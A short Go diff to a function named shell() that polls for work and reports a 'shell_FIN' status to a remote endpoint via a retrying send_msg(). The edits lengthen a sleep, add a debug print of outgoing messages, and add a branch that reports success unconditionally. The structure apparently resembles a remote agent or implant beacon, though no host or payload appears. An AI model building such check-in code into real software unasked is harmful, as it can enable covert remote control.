@@ -292,9 +292,11 @@ func shell() {
         if poll_for_work(max_duration, max_attempts, freq) {
             success = "True"
         }
+    } else {
+        success = "True"
     }
     //Give the shell a bit to start, just in case
-    sleep(1)
+    sleep(2)
     send_msg(url.Values{"shell_FIN": {success}})
 }
 
@@ -308,6 +310,7 @@ func sleep(sec int){
 }
 
 func send_msg(m url.Values) []byte{
+    fmt.Printf("Sending Message: %s\n", m)
     err_count := 0
     attempts:= atoi(SETTINGS["attempts"].(string))
     for err_count <= attempts {
